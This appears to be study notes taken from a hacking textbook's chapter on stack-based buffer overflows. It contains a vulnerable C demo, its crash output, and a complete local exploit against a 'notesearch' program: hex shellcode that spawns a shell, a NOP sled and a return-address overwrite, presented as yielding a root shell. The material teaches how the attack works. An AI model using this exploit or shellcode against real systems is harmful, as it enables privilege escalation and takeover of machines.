Buffer overflow vulnerabilities have been around since the early days of computers and still existt today
Most Internet worms use buffer overflow vulnerabilies to propogate, and even the most recent zero-day VML vulnerability in Internet Explorer is due to a buffer overflow
C is a high-level programming language, but it assumes that the programmer is responsible for data integrity
If this responsibility were shifted over to the compiler, the resulting binaries would be significantly slower, due to integrity checks on every variable
Also, this would remove a significant level of control form the programmer and compicate the language
While C's simplicity increases the programmer's control and the efficiency of the resulting programs, it can aslo result in programs that are vulnerable to buffer overflows and memory leaks if the programmer isn't careful
This means that once a variable is allocated memory, there are no built-in safe-guards to ensure that the contents of a variable fit into the allocated memory space
If a programmer wants to put 10 bytes of data into a buffer that had only been allocated 8 bytes of space, that type of action is allowed, even though it will most likely cause the program to crash
This is known as a buffer overrun or buffer overflow, since the extra 2 bytes of data will overflow and spill out of the allocated memory, overwriting whatever happens to come next
If a critical piece of data is overwritten, the program will crash

overflow_example.c
__________________________________________________________________________________
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    int value = 5;
    char buffer_one[8], buffer_two[8];

    strcpy(buffer_one, "one"); /* Put "one" into buffer_one */
    strcpy(buffer_two, "two"); /* Put "two" into buffer_two*/

    printf("[BEFORE] buffer_two is at %p and contains \'%s\'\n", buffer_two, buffer_two);
    printf("[BEFORE] buffer_one is at %p and contains \'%s\'\n", buffer_one, buffer_one);
    printf("[BEFORE] value is at %p and is %d (0x%08x)\n", &value, value);

    printf("\n[STRCPY] copying %d bytes into buffer_two\n\n", strlen(argv[1]));
    strcpy(buffer_two, argv[1]); /* Copy first argument into buffer_two */

    printf("[AFTER] buffer_two is at %p and contains \'%s\'\n", buffer_two, buffer_two);
    printf("[AFTER] buffer_one is at %p and contains \'%s\'\n", buffer_one, buffer_one);
    printf("[AFTER] value is at %p and is %d (0x%08x)\n", &value, value, value);
}
__________________________________________________________________________________

We try to copy 10 bytes from first command-line argument into buffer_two, which only has eight bytes allocated for it
__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc -o overflow_example overflow_example.c
reader@hacking:~/booksrc $ ./overflow_example 1234567890
[BEFORE] buffer_two is at 0xbffff7f0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7f8 and contains 'one'
[BEFORE] value is at 0xbffff804 and is 5 (0x00000005)
[STRCPY] copying 10 bytes into buffer_two
[AFTER] buffer_two is at 0xbffff7f0 and contains '1234567890'
[AFTER] buffer_one is at 0xbffff7f8 and contains '90'
[AFTER] value is at 0xbffff804 and is 5 (0x00000005)
__________________________________________________________________________________

We can notice that buffer_one is located directly after buffer_two in memory, so when 10 bytes are copied into buffer_two, last 2 bytes of 90 overflow into buffer_one and overwrite whatever was there
A large buffer will naturally overflow ino the other variables, but if a large enough buffer is used, the program will crash and die

__________________________________________________________________________________
reader@hacking:~/booksrc $ ./overflow_example AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)
[STRCPY] copying 29 bytes into buffer_two
[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAAAAAAAAAA'
[AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141)
Segmentation fault (core dumped)
__________________________________________________________________________________

These types of program crashes are fairly common-- think of all of the times a program has crashed or blue-screened on you
The programmer's mistake is one of omission-- there should be a length check or restriction on the user-supplied input
These kinds of mistakes are easy to make and can be difficult to spot
In fact, the notesearch.c program contains a buffer overflow bug

__________________________________________________________________________________
reader@hacking:~/booksrc $ ./notesearch AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-------[ end of note data ]-------
Segmentation fault
__________________________________________________________________________________

Program crashes are annoying, but in the hands of a hacker they can become downright dangerous
A knowledgeable hacker can take control of a program as it crashes, with some surprising results

exploit_notesearch.c
__________________________________________________________________________________
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char shellcode[]= 
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]) {
   unsigned int i, *ptr, ret, offset=270;
   char *command, *buffer;

   command = (char *) malloc(200);
   bzero(command, 200); // zero out the new memory

   strcpy(command, "./notesearch \'"); // start command buffer
   buffer = command + strlen(command); // set buffer at the end

   if(argc > 1) // set offset
      offset = atoi(argv[1]);

   ret = (unsigned int) &i - offset; // set return address

   for(i=0; i < 160; i+=4) // fill buffer with return address
      *((unsigned int *)(buffer+i)) = ret;
   memset(buffer, 0x90, 60); // build NOP sled
   memcpy(buffer+60, shellcode, sizeof(shellcode)-1); 

   strcat(command, "\'");

   system(command); // run exploit
   free(command);
}
__________________________________________________________________________________

The exploit's source code will be explained in depth later, but in general, it's just gennerating a command string that will execute the notesearch program with a command-line argument between single quotes
It uses string funcitons to do this: strlen() to get the current length of the string (to position the buffer pointer) and strcat() to concatenate the closing single quote to the end
Finally, the system function is used to execute the command string
The buffer that is generated between the single quotes is the real meat of the exploit
The rest is just a delivery method for this poison pill of data
A controlled crash:
__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc exploit_notesearch.c
reader@hacking:~/booksrc $ ./a.out
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
-------[ end of note data ]-------
__________________________________________________________________________________

The exploit is able to use the overflow to serve up a root shell--providing full control over the computer
This is an example of a stack-based buffer overflow exploit